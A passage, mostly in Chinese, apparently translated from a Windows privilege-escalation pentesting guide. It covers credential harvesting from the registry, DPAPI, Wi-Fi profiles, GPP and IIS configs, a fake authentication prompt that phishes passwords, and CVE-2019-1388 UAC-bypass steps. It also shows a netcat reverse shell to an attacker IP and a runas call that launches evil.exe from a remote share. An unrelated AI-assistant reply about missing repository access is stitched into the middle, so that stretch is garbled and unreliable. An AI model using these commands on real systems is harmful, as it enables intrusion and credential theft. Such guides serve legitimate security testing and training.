net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

检查 hosts file 中是否有其他已知主机被硬编码
```
type C:\Windows\System32\drivers\etc\hosts
```
### 网络接口与 DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### 开放端口

从外部检查是否有**受限服务**
```bash
netstat -ano #Opened ports?
```
### 路由表
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP 表
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### 防火墙规则

[**Check this page for Firewall related commands**](../basic-cmd-for-pentesters.md#firewall) **(列出规则、创建规则、关闭、关闭...)**

更多[ commands for network enumeration here](../basic-cmd-for-pentesters.md#network)

### 适用于 Linux 的 Windows 子系统 (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
二进制文件 `bash.exe` 也可以在 `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe` 找到

如果获得 root user，您可以监听任意端口（第一次使用 `nc.exe` 在端口上监听时，GUI 会提示是否允许 `nc` 通过防火墙）。
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
要以 root 身份轻松启动 bash，可以尝试 `--default-user root`

你可以在文件夹 `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\` 中浏览 `WSL` 文件系统

## Windows 凭据

### Winlogon 凭据
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### 凭据管理器 / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\  
Windows Vault 存储用于服务器、网站和其他程序的用户凭据，这些是 **Windows** 可以 **自动为用户登录** 的凭据。乍一看，这似乎意味着用户可以存储他们的 Facebook 凭据、Twitter 凭据、Gmail 凭据等，以便通过浏览器自动登录。但事实并非如此。

Windows Vault 存储的是 Windows 可以自动使用以登录用户的凭据，这意味着任何需要凭据以访问资源（服务器或网站）的 **Windows application that needs credentials to access a resource** 都 **can make use of this Credential Manager** 和 Windows Vault，并使用提供的凭据，而不是让用户每次都输入用户名和密码。

除非应用与 Credential Manager 交互，否则我认为它们不可能使用某个资源的凭据。因此，如果你的应用想使用 vault，它应该以某种方式 **与 credential manager 通信并从默认存储 vault 请求该资源的凭据**。

使用 `cmdkey` 列出机器上存储的凭据。
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
然后你可以使用 `runas` 和 `/savecred` 选项来使用已保存的凭据。下面的示例通过 SMB share 调用远程 binary。
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
使用提供的一组凭据运行 `runas`。
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
请注意，这些可能来自 mimikatz、lazagne、[credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html)、[VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html)，或来自 [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1)。

### DPAPI

The **Data Protection API (DPAPI)** 提供了一种对数据进行对称加密的方法，主要在 Windows 操作系统中用于对非对称私钥进行对称加密。该加密利用用户或系统的秘密来显著增加熵。

**DPAPI enables the encryption of keys through a symmetric key that is derived from the user's login secrets**。在涉及系统加密的场景中，它使用系统的域身份验证秘密。

使用 DPAPI 加密的用户 RSA 密钥存储在 `%APPDATA%\Microsoft\Protect\{SID}` 目录中，其中 `{SID}` 表示用户的 [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier)。**DPAPI 密钥与保护用户私钥的主密钥共同位于同一文件中**，通常由 64 字节的随机数据组成。（需要注意的是，对该目录的访问受限，无法通过 `dir` 命令在 CMD 中列出其内容，但可以通过 PowerShell 列出。）
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
你可以使用 **mimikatz module** `dpapi::masterkey` 并使用适当的参数 (`/pvk` 或 `/rpc`) 来解密它。

受主密码保护的凭据文件通常位于：
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
你可以使用 **mimikatz module** `dpapi::cred` 搭配适当的 `/masterkey` 来解密。\
你可以使用 `sekurlsa::dpapi` 模块（如果你是 root）从 **memory** 中**提取**许多 **DPAPI** **masterkeys**。


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell 凭据

**PowerShell credentials** 经常用于 **scripting** 和 **automation** 任务，作为一种方便地存储加密凭据的方式。这些凭据由 **DPAPI** 保护，通常意味着只有在创建它们的同一台计算机上由相同用户才能将其解密。

要从包含它的文件中**解密** PS 凭据，你可以执行：
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### 无线网络
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### 已保存的 RDP 连接

你可以在 `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\ 
以及在 `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### 最近运行的命令
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **远程桌面凭证管理器**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use the **Mimikatz** `dpapi::rdg` module with appropriate `/masterkey` to **解密任何 .rdg 文件`\
You can **extract many DPAPI masterkeys** from memory with the Mimikatz `sekurlsa::dpapi` module

### Sticky Notes

人们常在 Windows 工作站上使用 StickyNotes 应用来**保存密码**和其他信息，未意识到它是一个数据库文件。此文件位于 `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`，始终值得搜索和检查。

### AppCmd.exe

**注意，从 AppCmd.exe 恢复密码需要以 Administrator 身份并在 High Integrity 级别下运行。**\
**AppCmd.exe** 位于 `%systemroot%\system32\inetsrv\` 目录。\
如果该文件存在，则可能已配置一些**凭据**并可以被**恢复**。

This code was extracted from [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

检查是否存在 `C:\Windows\CCM\SCClient.exe` .\
安装程序以 **SYSTEM 权限 运行**，许多容易受到 **DLL Sideloading (信息来自** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## 文件和注册表（凭证）

### Putty 凭证
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH 主机密钥
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### 注册表中的 SSH 密钥

SSH 私钥可能存储在注册表键 `HKCU\Software\OpenSSH\Agent\Keys` 中，所以你应该检查那里是否有任何有趣的内容：
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
如果你在该路径中发现任何条目，它很可能是已保存的 SSH 密钥。它以加密方式存储，但可以使用 [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
关于该技术的更多信息： [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

如果 `ssh-agent` 服务未运行且你希望它在开机时自动启动，请运行:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> 看起来这个方法不再有效了。我尝试创建一些 ssh keys，用 `ssh-add` 添加它们，然后通过 ssh 登录到一台机器。注册表 HKCU\Software\OpenSSH\Agent\Keys 不存在，procmon 在非对称密钥认证期间未检测到使用 `dpapi.dll`。

### 无人值守文件
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
你也可以使用 **metasploit** 搜索这些文件：_post/windows/gather/enum_unattend_

示例内容：
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM 备份
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### 云凭证
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

搜索名为 **SiteList.xml** 的文件

### 缓存的 GPP 密码

之前存在一个功能，允许通过 Group Policy Preferences (GPP) 在一组机器上部署自定义本地管理员账户。然而，该方法存在严重的安全缺陷。首先，Group Policy Objects (GPOs) 以 XML 文件形式存放在 SYSVOL 中，任何域用户都可以访问。其次，这些 GPP 中的密码使用公开文档化的默认密钥以 AES256 加密，任何经过身份验证的用户都可以解密。这构成了严重风险，因为它可能允许用户获取提升的权限。

为缓解此风险，开发了一个函数用于扫描本地缓存的包含非空 "cpassword" 字段的 GPP 文件。找到此类文件后，该函数会解密密码并返回一个自定义 PowerShell 对象。该对象包括有关 GPP 和文件所在位置的详细信息，有助于识别和修复此安全漏洞。

在 `C:\ProgramData\Microsoft\Group Policy\history` 或 _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (previous to W Vista)_ 中查找这些文件：

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**要解密 cPassword：**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
使用 crackmapexec 获取密码：
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS Web 配置
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
带凭据的 web.config 示例：
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN 凭据
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### 日志
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### 请求 credentials

你可以随时**要求用户输入他的credentials，甚至输入不同用户的credentials**，如果你认为他可能知道（注意，直接**询问**客户端其**credentials**是非常**危险**的）：
```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```
### **可能包含 credentials 的文件名**

已知一些文件曾在某段时间包含 **passwords**，以 **clear-text** 或 **Base64** 存储
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
I don’t have access to your repository or the file contents. Please either:

- Paste the content of src/windows-hardening/windows-local-privilege-escalation/README.md here, or
- Provide the list of “proposed files” you want searched, or
- Give read access or upload the files.

Once you provide the file(s), I’ll translate the English text to Chinese following your rules (don’t translate code, technique names, links/paths/tags, or markdown/html).
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### 回收站中的凭证

你也应该检查回收站以查找其中的凭证

要 **recover passwords**（由多个程序保存的），你可以使用: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### 注册表内

**可能包含凭证的其他注册表键**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### 浏览器历史记录

你应该检查存放 **Chrome or Firefox** 密码的 dbs。  
另外也要检查浏览器的历史、书签和收藏，因为有些密码可能就存放在那里。

Tools to extract passwords from browsers:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** 是 Windows 操作系统中内置的一项技术，允许不同语言的软件组件之间的 **intercommunication**。每个 COM 组件通过 class ID (CLSID) 被 **identified via**，每个组件通过一个或多个接口（由 interface IDs (IIDs) 标识）来暴露功能。

COM classes and interfaces are defined in the registry under **HKEY\CLASSES\ROOT\CLSID** and **HKEY\CLASSES\ROOT\Interface** respectively. This registry is created by merging the **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Inside the CLSIDs of this registry you can find the child registry **InProcServer32** which contains a **default value** pointing to a **DLL** and a value called **ThreadingModel** that can be **Apartment** (单线程), **Free** (多线程), **Both** (单线程或多线程) or **Neutral** (线程中性).

![](<../../images/image (729).png>)

基本上，如果你能够覆盖将要被执行的任何 DLLs，就有可能在该 DLL 被不同用户执行时实现 escalate privileges。

To learn how attackers use COM Hijacking as a persistence mechanism check:


{{#ref}}
com-hijacking.md
{{#endref}}

### **文件和注册表中的通用密码搜索**

**搜索文件内容**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**搜索具有特定文件名的文件**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**在注册表中搜索密钥名称和密码**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### 搜索 passwords 的工具

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **是一个 msf plugin**。我创建这个 plugin 来 **自动执行 every metasploit POST module that searches for credentials** 在 victim 内。\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) 会自动搜索本页中提到的所有包含 passwords 的文件。\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) 是另一个很棒的工具，用于从系统中提取 passwords。

工具 [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) 会搜索若干保存这些数据为明文的工具的 **sessions**, **usernames** 和 **passwords** (PuTTY, WinSCP, FileZilla, SuperPuTTY, 和 RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

想象一下 **一个以 SYSTEM 身份运行的进程用 `OpenProcess()` 打开了一个新进程**，并赋予其 **full access**。同一进程 **还用 `CreateProcess()` 创建了一个新的低权限进程，但继承了主进程的所有打开句柄**。\
然后，如果你对该低权限进程拥有 **full access**，你可以获取用 `OpenProcess()` 打开的指向特权进程的 **open handle** 并 **注入 shellcode**。\
[阅读此示例以获取有关 **如何检测和利用此漏洞** 的更多信息。](leaked-handle-exploitation.md)\
[阅读这篇 **其他文章以更完整地解释如何测试和滥用不同权限级别继承的进程和线程的更多 open handlers（不仅仅是 full access）**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/)。

## Named Pipe Client Impersonation

共享内存段，称为 **pipes**，用于进程间通信和数据传输。

Windows 提供了一个名为 **Named Pipes** 的功能，允许不相关的进程共享数据，甚至跨不同网络。这类似于客户端/服务器架构，角色定义为 **named pipe server** 和 **named pipe client**。

当 **client** 通过 pipe 发送数据时，设置该 pipe 的 **server** 可以在拥有必要的 **SeImpersonate** 权限时 **采用 client 的身份**。识别与您建立的 pipe 通信的 **特权进程**，在该进程与您建立的 pipe 交互时模仿它的身份，就有机会通过采用该进程的身份来 **获取更高权限**。有关执行此类攻击的说明，请参阅[**这里**](named-pipe-client-impersonation.md)和[**这里**](#from-high-integrity-to-system)。

此外，下面的工具允许像 burp 这样的工具 **拦截 named pipe 通信：** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **而这个工具允许列出并查看所有 pipes 以查找 privescs：** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Telephony 服务 (TapiSrv) 在 server 模式下公开 `\\pipe\\tapsrv` (MS-TRP)。远程经过身份验证的客户端可以滥用基于 mailslot 的异步事件路径，将 `ClientAttach` 转变为对任何由 `NETWORK SERVICE` 可写的现有文件的任意 **4 字节写入**，然后获得 Telephony 管理权限并以服务身份加载任意 DLL。完整流程：

- 将 `ClientAttach` 的 `pszDomainUser` 设置为可写的现有路径 → 服务通过 `CreateFileW(..., OPEN_EXISTING)` 打开该路径并将其用于异步事件写入。
- 每个事件都会将由 `Initialize` 提供的受攻击者控制的 `InitContext` 写入该句柄。使用 `LRegisterRequestRecipient` (`Req_Func 61`) 注册线路应用，触发 `TRequestMakeCall` (`Req_Func 121`)，通过 `GetAsyncEvents` (`Req_Func 0`) 获取，然后注销/关闭以重复确定性写入。
- 将自己添加到 `C:\Windows\TAPI\tsec.ini` 中的 `[TapiAdministrators]`，重新连接，然后使用任意 DLL 路径调用 `GetUIDllName` 以作为 `NETWORK SERVICE` 执行 `TSPI_providerUIIdentify`。

更多细节：

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## 其他

### 在 Windows 中可能执行代码的文件扩展名

查看页面 **[https://filesec.io/](https://filesec.io/)**

### **监控命令行中的密码**

当以某个用户获取 shell 时，可能存在计划任务或其他正在执行的进程会将 **凭据以命令行参数的形式传递**。下面的脚本每两秒捕获一次进程命令行，并将当前状态与先前状态进行比较，输出任何差异。
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Stealing passwords from processes

## From Low Priv User to NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

如果你可以访问图形界面 (via console or RDP) 且启用了 UAC，则在某些 Microsoft Windows 版本中，非特权用户可以以 "NT\AUTHORITY SYSTEM" 身份运行终端或任何其他进程。

这使得可以利用同一个漏洞同时进行权限提升并绕过 UAC。此外，无需安装任何东西，过程中使用的 binary 是由 Microsoft 签名并发布的。

受影响的一些系统包括以下几种：
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
要利用此漏洞，需要执行以下步骤：
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
You have all the necessary files and information in the following GitHub repository:

https://github.com/jas502n/CVE-2019-1388

## From Administrator Medium to High Integrity Level / UAC Bypass

Read this to **learn about Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Then **read this to learn about UAC and UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP

